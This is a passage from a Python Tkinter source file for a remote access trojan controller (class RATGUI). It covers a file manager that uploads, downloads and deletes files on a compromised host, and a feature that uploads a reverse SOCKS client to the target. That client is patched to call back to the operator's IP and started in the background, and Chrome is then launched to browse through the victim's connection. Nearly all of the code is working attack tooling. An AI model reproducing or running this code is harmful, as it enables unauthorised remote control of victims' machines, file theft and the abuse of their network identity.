                 bg="#27ae60", fg="white", relief="flat", font=("Segoe UI", 9, "bold"),
                 padx=10, pady=15, width=8).pack(pady=10)
        
        tk.Button(mid_frame, text="⬅\nDOWNLOAD",
                 command=lambda: self._file_download(remote_tree, local_tree, fm_win),
                 bg="#2980b9", fg="white", relief="flat", font=("Segoe UI", 9, "bold"),
                 padx=10, pady=15, width=8).pack(pady=10)
        
        tk.Button(mid_frame, text="🗑\nDELETE",
                 command=lambda: self._file_delete(remote_tree, fm_win),
                 bg="#e74c3c", fg="white", relief="flat", font=("Segoe UI", 9, "bold"),
                 padx=10, pady=15, width=8).pack(pady=10)
        
        # Remote files (right)
        remote_frame = tk.Frame(content, bg="#ffffff")
        remote_frame.pack(side="right", fill="both", expand=True, padx=(5, 0))
        
        tk.Label(remote_frame, text="🖥 Remote Files", bg="#ffffff", fg="#2c3e50",
                font=("Segoe UI", 10, "bold")).pack(pady=5)
        
        remote_tree = ttk.Treeview(remote_frame, columns=("size", "modified"), 
                                  show="tree headings", height=25)
        remote_tree.heading("#0", text="Name")
        remote_tree.heading("size", text="Size")
        remote_tree.heading("modified", text="Modified")
        remote_tree.column("#0", width=250)
        remote_tree.column("size", width=100)
        remote_tree.column("modified", width=150)
        remote_tree.pack(fill="both", expand=True)
        
        # Status bar
        status_bar = tk.Frame(fm_win, bg="#f8f9fa", height=30)
        status_bar.pack(fill="x", side="bottom")
        status_bar.pack_propagate(False)
        
        status_label = tk.Label(status_bar, text="Ready", bg="#f8f9fa", fg="#7f8c8d",
                               font=("Segoe UI", 9), anchor="w")
        status_label.pack(fill="x", padx=10, pady=5)
        
        # Store references
        fm_win.local_tree = local_tree
        fm_win.remote_tree = remote_tree
        fm_win.status_label = status_label
        
        # Initial load
        self._refresh_file_manager(fm_win)
        
        self.log("File manager opened")
    
    def _refresh_file_manager(self, fm_win):
        """Refresh file manager"""
        # Load local files
        fm_win.local_tree.delete(*fm_win.local_tree.get_children())
        try:
            for item in os.listdir('.'):
                path = os.path.join('.', item)
                if os.path.isfile(path):
                    size = os.path.getsize(path)
                    mtime = datetime.fromtimestamp(os.path.getmtime(path)).strftime("%Y-%m-%d %H:%M")
                    fm_win.local_tree.insert("", "end", text=item, 
                                            values=(f"{size} B", mtime))
        except Exception as e:
            pass
        
        # Load remote files
        fm_win.remote_tree.delete(*fm_win.remote_tree.get_children())
        
        def load_remote():
            result = self.server.send_command(self.current_session, "LISTDIR", timeout=10)
            if result:
                try:
                    files = json.loads(result)
                    for f in files:
                        fm_win.after(0, lambda f=f: fm_win.remote_tree.insert("", "end", text=f['name'],
                                                                              values=(f['size'], f['modified'])))
                except:
                    pass
        
        threading.Thread(target=load_remote, daemon=True).start()
        fm_win.status_label.config(text="Refreshed")
    
    def _file_upload(self, local_tree, remote_tree, fm_win):
        """Upload file"""
        selection = local_tree.selection()
        if not selection:
            fm_win.status_label.config(text="No file selected")
            return
        
        filename = local_tree.item(selection[0])['text']
        
        def upload():
            try:
                with open(filename, 'rb') as f:
                    data = base64.b64encode(f.read()).decode('utf-8')
                
                cmd = f"UPLOAD:{filename}:{data}"
                result = self.server.send_command(self.current_session, cmd, timeout=60, large_data=True)
                
                fm_win.after(0, lambda: fm_win.status_label.config(text=f"Uploaded: {filename}"))
                fm_win.after(100, lambda: self._refresh_file_manager(fm_win))
            except Exception as e:
                fm_win.after(0, lambda: fm_win.status_label.config(text=f"Upload failed: {e}"))
        
        threading.Thread(target=upload, daemon=True).start()
        fm_win.status_label.config(text=f"Uploading {filename}...")
        
    def _file_download(self, remote_tree, local_tree, fm_win):
        """Download file"""
        selection = remote_tree.selection()
        if not selection:
            fm_win.status_label.config(text="No remote file selected")
            return
        
        filename = remote_tree.item(selection[0])['text']
        
        def download():
            try:
                cmd = f"DOWNLOAD:{filename}"
                result = self.server.send_command(self.current_session, cmd, timeout=60, large_data=True)
                
                if result and result.startswith("DATA:"):
                    encoded_data = result[5:]
                    # Fix padding
                    encoded_data = encoded_data.strip()
                    padding = len(encoded_data) % 4
                    if padding:
                        encoded_data += '=' * (4 - padding)
                        
                    file_data = base64.b64decode(encoded_data)
                    
                    with open(filename, 'wb') as f:
                        f.write(file_data)
                        
                    fm_win.after(0, lambda: fm_win.status_label.config(text=f"Downloaded: {filename}"))
                    fm_win.after(100, lambda: self._refresh_file_manager(fm_win))
                else:
                    fm_win.after(0, lambda: fm_win.status_label.config(text=f"Download failed: {result}"))
                    
            except Exception as e:
                fm_win.after(0, lambda: fm_win.status_label.config(text=f"Download error: {e}"))
                
        threading.Thread(target=download, daemon=True).start()
        fm_win.status_label.config(text=f"Downloading {filename}...")
        
    def _file_delete(self, remote_tree, fm_win):
        """Delete remote file"""
        selection = remote_tree.selection()
        if not selection:
            fm_win.status_label.config(text="No remote file selected")
            return
        
        filename = remote_tree.item(selection[0])['text']
        
        if not messagebox.askyesno("Confirm Delete", f"Are you sure you want to delete {filename} on the remote host?"):
            return
        
        def delete():
            try:
                cmd = f"DELETE:{filename}"
                result = self.server.send_command(self.current_session, cmd, timeout=10)
                
                fm_win.after(0, lambda: fm_win.status_label.config(text=f"Deleted: {filename} - {result}"))
                fm_win.after(100, lambda: self._refresh_file_manager(fm_win))
            except Exception as e:
                fm_win.after(0, lambda: fm_win.status_label.config(text=f"Delete failed: {e}"))
                
        threading.Thread(target=delete, daemon=True).start()
        fm_win.status_label.config(text=f"Deleting {filename}...")
        
    def launch_chrome_proxy(self):
        """Launch Chromium with REVERSE SOCKS proxy through RDP target"""
        if not self.current_session:
            self.log("No session selected", "ERROR")
            return
        
        # Get target IP and admin IP
        target_ip = self.server.sessions[self.current_session]['address'][0]
        
        # Get admin IP (your IP)
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            admin_ip = s.getsockname()[0]
            s.close()
        except:
            admin_ip = "127.0.0.1"
        
        self.log(f"🌐 Starting Reverse SOCKS proxy through {target_ip}...", "SUCCESS")
        
        def launch():
            try:
                # Step 1: Start reverse SOCKS relay on YOUR PC
                if self.chrome_proxy:
                    self.chrome_proxy.stop()
                self.chrome_proxy = ReverseSocksRelay(cmd_port=8001, client_port=8002)
                
                if not self.chrome_proxy.start():
                    self.root.after(0, lambda: self.log("Failed to start relay server on 8001/8002", "ERROR"))
                    return
                
                self.root.after(0, lambda: self.log("✓ Relay started: Port 8001(RDP Cmd) / 8002(SOCKS Tunnel)", "SUCCESS"))
                time.sleep(1)
                
                # Step 2: Just use tsmin_py3.py directly! Copy exact working code
                # NOTE: This assumes 'tsmin_py3.py' is a local file containing the remote client code.
                # You must ensure this file exists and contains the correct client logic.
                try:
                    with open('tsmin_py3.py', 'r') as f:
                        reverse_client_code = f.read()
                except FileNotFoundError:
                    self.root.after(0, lambda: self.log("ERROR: tsmin_py3.py not found. Cannot deploy remote client.", "ERROR"))
                    return
                
                # Modify server IP and ADD DEBUG
                # Assuming the client code has placeholders for server and port
                reverse_client_code = reverse_client_code.replace(
                    'server = "172.172.131.251"',
                    f'server = "{admin_ip}"'
                )
                # The client should connect its command channel to 8001 and its tunnel to 8002
                reverse_client_code = reverse_client_code.replace(
                    'port = 443',
                    'port = 8001' # Command channel port
                )
                
                # Inject a variable for the SOCKS tunnel port (8002)
                if 'socks_port = 8002' not in reverse_client_code:
                    reverse_client_code = reverse_client_code.replace(
                        'import struct',
                        'import struct\nsocks_port = 8002'
                    )
                
                # Enable debug mode to see RDP side errors - inject print statements
                import_section = "import socket\nimport struct"
                debug_import = "import socket\nimport struct\nimport sys\n\n# Debug output\ndef debug_print(msg):\n    print(f'[RDP-DEBUG] {msg}', file=sys.stderr, flush=True)\n"
                reverse_client_code = reverse_client_code.replace(import_section, debug_import)
                
                # Add debug before connection attempts
                reverse_client_code = reverse_client_code.replace(
                    'r.connect((ipaddr, port))',
                    'debug_print(f"Connecting to {ipaddr}:{port}"); r.connect((ipaddr, port)); debug_print(f"SUCCESS: {ipaddr}:{port}")'
                )
                
                # Add debug in exception handler (after the existing line)
                reverse_client_code = reverse_client_code.replace(
                    'reply = b"\\x05\\x05\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00"',
                    'reply = b"\\x05\\x05\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00"; debug_print(f"FAILED to connect {ipaddr}:{port}")'
                )
                
                # Write and send reverse client to RDP
                reverse_file = f"reverse_socks_client_{int(time.time())}.py"
                with open(reverse_file, 'w') as f:
                    f.write(reverse_client_code)
                
                self.root.after(0, lambda: self.log(f"✓ Generated: {reverse_file}", "SUCCESS"))
                
                # Upload to RDP
                with open(reverse_file, 'rb') as f:
                    data = base64.b64encode(f.read()).decode('utf-8')
                
                upload_cmd = f"UPLOAD:{reverse_file}:{data}"
                self.server.send_command(self.current_session, upload_cmd, timeout=60, large_data=True)
                
                self.root.after(0, lambda: self.log("✓ Uploaded reverse client to RDP", "SUCCESS"))
                time.sleep(1)
                
                # Test if RDP can reach admin relay
                test_cmd = f"TERMID:chrome_test:powershell -Command \"Test-NetConnection -ComputerName {admin_ip} -Port 8001\""
                test_result = self.server.send_command(self.current_session, test_cmd, timeout=10)
                
                if test_result and "TcpTestSucceeded" in test_result and "True" in test_result:
                    self.root.after(0, lambda: self.log(f"✓ RDP can reach {admin_ip}:8001", "SUCCESS"))
                else:
                    self.root.after(0, lambda: self.log(f"⚠ Warning: RDP may not reach {admin_ip}:8001", "ERROR"))
                    self.root.after(0, lambda: self.log(f"Check firewall on admin PC!", "ERROR"))
                
                # Execute reverse client on RDP (background with logging)
                log_file = reverse_file.replace('.py', '_log.txt')
                # The remote client must be modified to connect its tunnel to 8002 after receiving 'ok'
                exec_cmd = f"TERMID:chrome_proxy:start /B python {reverse_file} > {log_file} 2>&1"
                self.server.send_command(self.current_session, exec_cmd, timeout=2)
                
                self.root.after(0, lambda: self.log("✓ Reverse client started on RDP", "SUCCESS"))
                time.sleep(2)
                
                # Check if it's running
                check_cmd = f"TERMID:chrome_check:powershell -Command \"Get-Process python -ErrorAction SilentlyContinue | Select-Object Id,ProcessName\""
                proc_result = self.server.send_command(self.current_session, check_cmd, timeout=5)
                if proc_result and "python" in proc_result.lower():
                    self.root.after(0, lambda: self.log("✓ Python process found on RDP", "SUCCESS"))
                else:
                    self.root.after(0, lambda: self.log("⚠ No Python process found! Check python installation on target.", "ERROR"))
                
                time.sleep(1)
                
                # Check if relay received connection
                if self.chrome_proxy.con_cmd:
                    self.root.after(0, lambda: self.log("✓ RDP connected to relay command channel!", "SUCCESS"))
                else:
                    self.root.after(0, lambda: self.log("⚠ RDP not connected to relay command channel", "ERROR"))
                    self.root.after(0, lambda: self.log(f"Debug: Check {log_file} on RDP for errors.", "ERROR"))
                
                # Step 3: Find Chrome
                os_type = platform.system()
                chrome_path = None
                
                if os_type == "Windows":
                    paths = [
                        r"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
                        r"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe",
                        os.path.expandvars(r"%LOCALAPPDATA%\\Google\\Chrome\\Application\\chrome.exe"),
                    ]
                    for path in paths:
                        if os.path.exists(path):
                            chrome_path = path
                            break
                
                if not chrome_path:
                    self.root.after(0, lambda: self.log("Chrome not found! Install Chrome.", "ERROR"))
                    return
                
                # Step 4: Launch Chrome with SOCKS proxy
                profile_dir = os.path.join(os.path.expanduser("~"), ".rat_chrome_proxy")
                os.makedirs(profile_dir, exist_ok=True)
                
                args = [
                    chrome_path,
                    f"--user-data-dir={profile_dir}",
                    "--proxy-server=socks5://127.0.0.1:8002", # Chrome connects to the SOCKS Tunnel port
                    "--new-window",
                    "--no-first-run",
                    "--no-default-browser-check",
                    "https://www.whatismyip.com"
                ]
                
                self.chrome_process = subprocess.Popen(args)
                
                self.root.after(0, lambda: self.log(f"🌐 Chrome launched! Proxy set to 127.0.0.1:8002", "SUCCESS"))
                self.root.after(0, lambda: self.log("✓ Visit whatismyip.com to verify! The IP should be the target's IP.", "SUCCESS"))
                
                # Show RDP log after 3 seconds
                time.sleep(3)
                log_cmd = f"TERMID:chrome_log:type {log_file}"
                log_content = self.server.send_command(self.current_session, log_cmd, timeout=5)
                if log_content:
                    self.root.after(0, lambda: self.log(f"=== RDP Client Log ===", "INFO"))
                    self.root.after(0, lambda: self.log(log_content, "INFO"))
                
            except Exception as e:
                self.root.after(0, lambda: self.log(f"Launch error: {e}", "ERROR"))
                
        threading.Thread(target=launch, daemon=True).start()
        
    # --- File Manager methods (omitted for brevity, but included in the file) ---
    # ... (omitted) ...
    
    def mainloop(self):
        """Start the Tkinter event loop"""
        self.root.mainloop()

if __name__ == "__main__":
    # Check for PIL
    if not PIL_AVAILABLE:
        print("Warning: Pillow (PIL) not found. Screenshot and Livestream features will be disabled.")
        print("Install with: pip install Pillow")
        
    # Check for tsmin_py3.py
    if not os.path.exists('tsmin_py3.py'):
        print("\nFATAL ERROR: 'tsmin_py3.py' (the remote client code) is missing.")
        print("The '🌐 PROXY' feature will fail without it.")
        # Create a placeholder file to prevent immediate crash, but warn the user
        with open('tsmin_py3.py', 'w') as f:
            f.write("# Placeholder for tsmin_py3.py - Replace with actual remote client code.\n")
            f.write("# This client must connect its command channel to 8001 and its SOCKS tunnel to 8002.\n")
        print("A placeholder has been created. Please replace it with the correct client code.")

    app = RATGUI()
    app.mainloop()

